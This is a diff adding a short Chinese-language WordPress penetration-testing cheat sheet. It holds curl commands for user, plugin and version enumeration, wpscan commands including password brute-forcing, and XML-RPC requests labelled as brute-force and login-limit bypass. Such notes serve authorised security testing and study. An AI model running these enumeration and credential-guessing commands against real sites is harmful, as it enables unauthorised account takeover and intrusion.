@@ -1,0 +1,40 @@
+# WordPress 安全
+
+## 枚举
+```bash
+# 用户枚举
+curl http://target/?author=1
+curl http://target/wp-json/wp/v2/users
+
+# 插件枚举
+curl http://target/wp-content/plugins/插件名/readme.txt
+
+# 版本探测
+curl http://target/readme.html
+curl http://target/?p=1
+```
+
+## 常用工具
+```bash
+wpscan --url http://target -e u,vp,vt
+wpscan --url http://target --passwords wordlist.txt
+wpscan --url http://target --api-token API_KEY  # 漏洞库查询
+```
+
+## XML-RPC 攻击
+```bash
+# 爆破（速度快）
+curl http://target/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
+
+# 绕过登录限制
+curl http://target/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>wp.getUserBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>'
+```
+
+## 常见漏洞
+```bash
+# 文件上传（主题/插件）
+# SQL 注入（插件）
+# XSS（评论/插件）
+# SSRF（某些插件）
+# 权限提升（用户角色）
+```
